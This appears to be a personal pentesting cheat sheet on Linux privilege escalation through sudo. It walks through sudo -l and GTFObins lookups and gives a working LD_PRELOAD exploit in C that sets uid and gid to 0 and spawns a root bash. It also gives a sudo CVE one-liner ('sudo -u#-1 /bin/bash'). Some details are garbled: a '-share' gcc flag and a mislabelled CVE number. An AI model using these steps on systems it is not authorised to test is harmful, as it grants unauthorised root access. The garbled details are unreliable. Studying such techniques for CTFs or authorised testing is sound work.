
##### sudo shell escaping

`sudo -l` will tell us the permissions granted to current user account, and this is very useful for identifying misconfiguration and exploit. If we have certain bins that has root access then we can use [GTFObins](https://gtfobins.github.io/) to by pass local security restriction. 

- first run `sudo -l`
- from the list of result select one bin such as vim that has root access
- then go to [GTFObins](https://gtfobins.github.io/) and search for vim then select sudo 
- finally copy the command from the website and execute it

##### Via Intended Functionality

Search google example `apache2 sudo privesc`


##### via LD PRELOAD

First create a file shell.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

int _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

compile and run 

```
gcc -fPIC -share -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/shell.so [bin]
# [bin] is any bin that we can as a root
```

Here are some more recent CVE vulns to escalate our privilege 

[CVE-2019-10-15](https://www.exploit-db.com/exploits/47502)
 - `sudo -u#-1 /bin/bash`

[CVE-2023-22809](https://www.exploit-db.com/exploits/51217)


